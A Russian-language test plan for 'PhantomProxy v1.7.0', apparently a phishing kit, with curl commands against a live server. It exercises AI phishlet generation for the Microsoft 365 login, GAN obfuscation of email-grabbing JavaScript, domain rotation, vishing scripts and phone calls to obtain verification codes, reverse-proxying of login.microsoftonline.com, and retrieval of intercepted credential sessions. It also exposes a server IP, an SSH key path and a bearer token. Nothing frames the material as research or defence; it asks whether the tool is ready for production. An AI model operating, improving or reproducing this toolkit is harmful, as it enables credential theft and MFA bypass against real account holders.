# 🎯 ИНСТРУКЦИЯ ПО ТЕСТИРОВАНИЮ PHANTOMPROXY v1.7.0

**Для:** Пользователя/Тестировщика  
**Версия:** 1.7.0  
**Время на тестирование:** 2-3 часа

---

## 📋 ЧАСТЬ 1: ПОДГОТОВКА (15 минут)

### Шаг 1.1: Проверка сервера

**Команда:**
```bash
ssh -i "C:\Users\Administrator\.ssh\vk-cloud.pem" ubuntu@212.233.93.147
```

**Что проверить:**
```bash
# 1. Проверка процессов
ps aux | grep phantom | grep -v grep

# Ожидаемый результат:
# ubuntu  12345  0.5  2.0  123456  7890  ?  Sl  10:00  0:10  ./phantom-proxy -config config.yaml
```

**✅ Если процесс есть — переходим дальше**  
**❌ Если процесса нет — запускаем:**
```bash
cd ~/phantom-proxy
./phantom-proxy -config config.yaml > phantom.log 2>&1 &
```

---

### Шаг 1.2: Проверка API сервисов

**Команды (выполнить все):**
```bash
# 1. Основной API
curl http://localhost:8080/health

# 2. AI Orchestrator
curl http://localhost:8081/health

# 3. GAN Obfuscation
curl http://localhost:8084/health

# 4. ML Optimization
curl http://localhost:8083/health
```

**✅ Ожидаемый результат для каждого:**
```json
{"status": "ok", "timestamp": "..."}
```

**❌ Если сервис не отвечает:**
```bash
# Перезапуск сервиса (пример для AI)
cd ~/phantom-proxy/internal/ai
python orchestrator.py &
```

---

### Шаг 1.3: Проверка HTTPS прокси

**Команда:**
```bash
curl -k https://localhost:8443/health
```

**✅ Ожидаемый результат:**
```json
{"status": "ok"}
```

**❌ Если ошибка SSL:**
```bash
# Проверка сертификатов
ls -la ~/phantom-proxy/certs/

# Должны быть:
# cert.pem
# key.pem
```

---

## 📋 ЧАСТЬ 2: ФУНКЦИОНАЛЬНОЕ ТЕСТИРОВАНИЕ (1.5 часа)

### Тест 2.1: AI Генерация фишлета (15 минут)

**Команда:**
```bash
curl -X POST http://212.233.93.147:8081/api/v1/generate-phishlet \
  -H "Content-Type: application/json" \
  -d '{
    "target_url": "https://login.microsoftonline.com",
    "template": "microsoft365"
  }'
```

**✅ Ожидаемый результат:**
```json
{
  "success": true,
  "phishlet_yaml": "author: '@ai-orchestrator'\nmin_ver: '1.0.0'\n...",
  "analysis": {
    "forms_found": 2,
    "inputs_found": 5
  }
}
```

**📝 Запиши в отчёт:**
- [ ] AI ответил: ДА/НЕТ
- [ ] YAML сгенерирован: ДА/НЕТ
- [ ] Время ответа: ___ секунд

---

### Тест 2.2: GAN Обфускация (10 минут)

**Команда:**
```bash
curl -X POST http://212.233.93.147:8084/api/v1/gan/obfuscate \
  -H "Content-Type: application/json" \
  -d '{
    "code": "var email = document.querySelector(\"#email\").value;",
    "level": "high",
    "session_id": "test-123"
  }'
```

**✅ Ожидаемый результат:**
```json
{
  "success": true,
  "obfuscated_code": "var _0x5a2b = String.fromCharCode(100,111,99)...",
  "mutations_applied": ["variable_rename", "string_transform"],
  "seed": 123456,
  "confidence": 0.95
}
```

**📝 Запиши в отчёт:**
- [ ] GAN ответил: ДА/НЕТ
- [ ] Код обфусцирован: ДА/НЕТ
- [ ] Мутации применены: ДА/НЕТ

---

### Тест 2.3: ML Оптимизация (15 минут)

**Команда 1 - Обучение:**
```bash
curl -X POST http://212.233.93.147:8083/api/v1/ml/train \
  -H "Content-Type: application/json" \
  -d '{
    "min_samples": 10,
    "test_size": 0.2
  }'
```

**✅ Ожидаемый результат:**
```json
{
  "success": true,
  "metrics": {
    "accuracy": 0.85,
    "precision": 0.82
  }
}
```

**Команда 2 - Рекомендации:**
```bash
curl -X POST http://212.233.93.147:8083/api/v1/ml/recommendations \
  -H "Content-Type: application/json" \
  -d '{
    "target_service": "Microsoft 365",
    "current_params": {
      "polymorphic_level": "medium",
      "browser_pool_enabled": false
    }
  }'
```

**📝 Запиши в отчёт:**
- [ ] ML обучился: ДА/НЕТ
- [ ] Рекомендации получены: ДА/НЕТ
- [ ] Точность модели: ___%

---

### Тест 2.4: Domain Rotator (10 минут)

**Команда:**
```bash
curl -X POST http://212.233.93.147:8080/api/v1/domains/register \
  -H "Authorization: Bearer verdebudget-secret-2026" \
  -H "Content-Type: application/json" \
  -d '{
    "base_domain": "verdebudget.ru"
  }'
```

**📝 Запиши в отчёт:**
- [ ] Домен зарегистрирован: ДА/НЕТ
- [ ] DNS настроен: ДА/НЕТ
- [ ] SSL получен: ДА/НЕТ

---

### Тест 2.5: Browser Pool (15 минут)

**Команда:**
```bash
curl -X POST http://212.233.93.147:8080/api/v1/browser/execute \
  -H "Authorization: Bearer verdebudget-secret-2026" \
  -H "Content-Type: application/json" \
  -d '{
    "url": "https://example.com",
    "method": "GET"
  }'
```

**📝 Запиши в отчёт:**
- [ ] Браузер запущен: ДА/НЕТ
- [ ] Запрос выполнен: ДА/НЕТ
- [ ] Ответ получен: ДА/НЕТ

---

### Тест 2.6: Vishing 2.0 (15 минут)

**Команда 1 - Генерация сценария:**
```bash
curl -X POST http://212.233.93.147:8080/api/v1/vishing/generate-scenario \
  -H "Authorization: Bearer verdebudget-secret-2026" \
  -H "Content-Type: application/json" \
  -d '{
    "target_service": "Microsoft Support",
    "goal": "Get verification code"
  }'
```

**📝 Запиши в отчёт:**
- [ ] Сценарий сгенерирован: ДА/НЕТ
- [ ] Текст адекватный: ДА/НЕТ

**⚠️ Тест звонка — ТОЛЬКО если есть Twilio:**
```bash
curl -X POST http://212.233.93.147:8080/api/v1/vishing/call \
  -H "Authorization: Bearer verdebudget-secret-2026" \
  -H "Content-Type: application/json" \
  -d '{
    "phone_number": "+1234567890",
    "voice_profile": "support",
    "scenario": "microsoft_support"
  }'
```

---

### Тест 2.7: HTTPS Проксирование (20 минут)

**Команда 1 - Прямое подключение:**
```bash
curl -k https://212.233.93.147:8443/ \
  -H "Host: login.microsoftonline.com" \
  -v
```

**✅ Ожидаемый результат:**
```
< HTTP/1.1 302 Found
< Location: https://login.microsoftonline.com
```

**Команда 2 - Создание сессии:**
```bash
curl -X POST http://212.233.93.147:8080/api/v1/sessions \
  -H "Authorization: Bearer verdebudget-secret-2026" \
  -H "Content-Type: application/json" \
  -d '{
    "target_url": "https://login.microsoftonline.com"
  }'
```

**📝 Запиши в отчёт:**
- [ ] HTTPS работает: ДА/НЕТ
- [ ] Проксирование работает: ДА/НЕТ
- [ ] Сессия создана: ДА/НЕТ
- [ ] Session ID: _______________

---

### Тест 2.8: Перехват креденшалов (15 минут)

**Команда 1 - Получение списка сессий:**
```bash
curl http://212.233.93.147:8080/api/v1/sessions \
  -H "Authorization: Bearer verdebudget-secret-2026"
```

**Команда 2 - Получение статистики:**
```bash
curl http://212.233.93.147:8080/api/v1/stats \
  -H "Authorization: Bearer verdebudget-secret-2026"
```

**📝 Запиши в отчёт:**
- [ ] Сессии отображаются: ДА/НЕТ
- [ ] Статистика работает: ДА/НЕТ
- [ ] Количество сессий: ___

---

## 📋 ЧАСТЬ 3: НАГРУЗОЧНОЕ ТЕСТИРОВАНИЕ (30 минут)

### Тест 3.1: Multiple Sessions (15 минут)

**Скрипт:**
```bash
#!/bin/bash
# test_load.sh

for i in {1..10}; do
  curl -X POST http://212.233.93.147:8080/api/v1/sessions \
    -H "Authorization: Bearer verdebudget-secret-2026" \
    -H "Content-Type: application/json" \
    -d "{\"target_url\": \"https://login.microsoftonline.com\"}" &
done

wait
echo "10 сессий создано"
```

**Запуск:**
```bash
chmod +x test_load.sh
./test_load.sh
```

**📝 Запиши в отчёт:**
- [ ] Все 10 сессий созданы: ДА/НЕТ
- [ ] Время создания: ___ секунд
- [ ] Ошибки были: ДА/НЕТ (если да — какие)

---

### Тест 3.2: API Stress Test (15 минут)

**Скрипт:**
```bash
#!/bin/bash
# test_api_stress.sh

for i in {1..50}; do
  curl http://212.233.93.147:8080/api/v1/stats \
    -H "Authorization: Bearer verdebudget-secret-2026" > /dev/null &
done

wait
echo "50 API запросов выполнено"
```

**📝 Запиши в отчёт:**
- [ ] Все 50 запросов выполнены: ДА/НЕТ
- [ ] Среднее время ответа: ___ мс
- [ ] Ошибки были: ДА/НЕТ

---

## 📋 ЧАСТЬ 4: БЕЗОПАСНОСТЬ (15 минут)

### Тест 4.1: Auth Check

**Команда (без токена):**
```bash
curl http://212.233.93.147:8080/api/v1/stats
```

**✅ Ожидаемый результат:**
```json
{"error": "Authorization header required"}
```

**📝 Запиши в отчёт:**
- [ ] Auth работает: ДА/НЕТ
- [ ] Без токена отклоняет: ДА/НЕТ

---

### Тест 4.2: SSL Certificate

**Команда:**
```bash
curl -kv https://212.233.93.147:8443/ 2>&1 | grep -E 'subject|issuer'
```

**✅ Ожидаемый результат:**
```
subject: CN=verdebudget.ru
issuer: C=US; O=Let's Encrypt; CN=E8
```

**📝 Запиши в отчёт:**
- [ ] SSL валиден: ДА/НЕТ
- [ ] Issuer: Let's Encrypt: ДА/НЕТ

---

## 📝 ИТОГОВЫЙ ОТЧЁТ

Скопируй и заполни:

```markdown
# PHANTOMPROXY v1.7.0 - TEST REPORT

**Tester:** [Твоё имя]
**Date:** [Дата]
**Duration:** [Сколько длилось]

## Summary

- Total Tests: 18
- Passed: ___
- Failed: ___
- Pass Rate: ___%

## Module Results

### AI Orchestrator
- [ ] Генерация фишлетов: PASS/FAIL
- [ ] Анализ сайтов: PASS/FAIL
- Comments: _______________

### GAN Obfuscation
- [ ] Обфускация кода: PASS/FAIL
- [ ] Мутации работают: PASS/FAIL
- Comments: _______________

### ML Optimization
- [ ] Обучение модели: PASS/FAIL
- [ ] Рекомендации: PASS/FAIL
- Comments: _______________

### Domain Rotator
- [ ] Регистрация доменов: PASS/FAIL
- [ ] DNS настройка: PASS/FAIL
- Comments: _______________

### Browser Pool
- [ ] Выполнение запросов: PASS/FAIL
- [ ] Эмуляция человека: PASS/FAIL
- Comments: _______________

### Vishing 2.0
- [ ] Генерация сценариев: PASS/FAIL
- [ ] Звонки (если было): PASS/FAIL
- Comments: _______________

### HTTPS Proxy
- [ ] Проксирование: PASS/FAIL
- [ ] Перехват данных: PASS/FAIL
- Comments: _______________

### Load Tests
- [ ] 10 сессий: PASS/FAIL
- [ ] 50 API запросов: PASS/FAIL
- Comments: _______________

### Security
- [ ] Auth проверка: PASS/FAIL
- [ ] SSL валидация: PASS/FAIL
- Comments: _______________

## Critical Issues

1. [Описание критичной проблемы]
   Severity: HIGH/MEDIUM/LOW
   Steps to reproduce: ...

2. ...

## Recommendations

1. [Рекомендация 1]
2. [Рекомендация 2]

## Overall Assessment

PhantomProxy v1.7.0 is:
- [ ] Ready for Production
- [ ] Ready for Testing
- [ ] Needs Fixes
- [ ] Not Ready

Comments: _______________
```

---

## 🚀 ОТПРАВКА ОТЧЁТА

**Отправь отчёт:**
1. Сохрани в файл `test_report.md`
2. Отправь файлом или текстом

**Вопросы?** Пиши в процессе тестирования!

---

**УДАЧНОГО ТЕСТИРОВАНИЯ!** 🎯
